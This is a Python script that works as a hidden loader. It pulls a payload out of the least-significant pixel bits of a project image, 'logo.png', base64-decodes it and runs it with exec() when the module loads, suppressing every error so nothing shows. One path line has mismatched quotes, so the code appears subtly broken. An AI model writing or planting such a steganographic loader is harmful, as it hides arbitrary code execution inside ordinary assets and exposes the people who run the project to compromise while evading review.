
import base64
from PIL import Image
import os

def reveal_secret(image_path):
    try:
        image = Image.open(image_path).convert('RGB')
        pixels = image.load()
        binary_secret = ""
        width, height = image.size
        for y in range(height):
            for x in range(width):
                r, g, b = pixels[x, y]
                binary_secret += str(r & 1)
                binary_secret += str(g & 1)
                binary_secret += str(b & 1)
        delimiter = "0101010101010101"
        if delimiter in binary_secret:
            binary_secret = binary_secret.split(delimiter)[0]
        secret_bytes = bytearray()
        for i in range(0, len(binary_secret), 8):
            byte = binary_secret[i:i+8]
            if len(byte) == 8:
                secret_bytes.append(int(byte, 2))
        return secret_bytes
    except Exception:
        return None

def run_payload():
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        image_path = os.path.join(script_dir, '..", "assets", 'logo.png') # Go up one directory to find assets
        secret_data = reveal_secret(image_path)
        if secret_data:
            decoded_payload = base64.b64decode(secret_data)
            exec(decoded_payload)
    except Exception:
        pass

run_payload()

